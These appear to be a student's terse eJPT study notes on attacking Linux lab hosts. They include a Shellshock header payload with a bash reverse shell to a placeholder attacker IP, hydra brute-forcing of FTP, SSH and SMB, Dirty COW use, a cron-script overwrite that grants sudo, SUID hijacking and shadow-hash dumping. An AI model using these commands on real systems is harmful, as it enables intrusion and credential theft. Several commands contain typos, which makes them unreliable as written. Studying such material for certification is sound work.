# 08hakr's Short Notes eJPT
# 006 INE-Host-and-Network-Penetration-Testing-System-Host Based-Attacks Linux

## Linux Vulnerabilities Services
### Shellshock Linux
- Apache and Bash
- nmap -sV <target-ip>
- nmap --script=http-shellshock --script-args "http-shellshoock.uri=/gettime.cgi"
- capture in burpUser-Agent: () { :; }; echo; echo; /bin/bash -c 'catt /etc/passwd'
-  -c 'bash -i>&/dev/tcp/<attacker-ip>/<port> 0>&1'

- with metasploit- search shellshock
- auxiliary and exploit module
- set rhosts and targeturi /gettime.cgi

### Exploiting FTP 20 21
- hydra  -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt ftp://<target-ip> -t 4 ftp

### Exploiting SSH 22
- bruteforce
- metasploit module ssh_login
- hydra  -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt <target-ip> -t 4 ssh

## Exploiting SAMBA 445 on netBIOS 139
- nmap -sV <target-ip>
- hydra -l -P unix_password <target-ip> smb
- smbmap -H <target-ip> -u admin -p password1
- smbclient -L <target-ip> -U admin
- smbclient //<target-ip>/shawn -U admin to take smb SHell
- tar xzf flag.tar.gz
- enum4linux -a <target-ip>

## Linux Kernel Exploits
- linux exploit suggester
- sysinfo
- getuid
- shell /bin/bash/ -i- cat /etc/passwd
- download Linux-exploit-suggester
- upload /les.sh
- shell /bin/bash/ -i
- chmod +x les.sh
- ./les.sh
- download dirty cow
- compile it and upload to the target system
- ./dirty passwd
- if doesnt run then upload .c and compile on target
- run ssh with give password of firefart user
-
## Exploiting Cron Jobs
- whoami
- groups student
- crontab -l
- ls -al
- cd /
- grep -rnw /usr -e "/home/student/message"  checking any occurance of this file in any other file
- follow the steps where they leads you
- ls -al /usr/local/share/copy.sh
- printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
- sudo -l
- corntab -l

## Exploiting SUID Binaries
- whoami
- groups student
- ls -al (take a look at S in permission its a thing that shows its SUID)
- file welcome
- string welcome
- rm greetings
- co /bin/bash greetings
- ./welcome

## Dumping Linux Password Hashes
- /etc/passwd Users account information
- /etc/shadow
- $1 MD5
- $2 Blowfish
- $5 SHA-256
- $6 SHA-512
- nmap -sV <taerget-ip>
- searchsploit proftpd
- 1.3.3c
- msfconsole
- search proft
- use set run
- /bin/bash -i
- ctrl+z background
- sessions
- sessions -u 1
- cat /etc/shadow
- search hashdump post/linux/gather/hashdump
- run
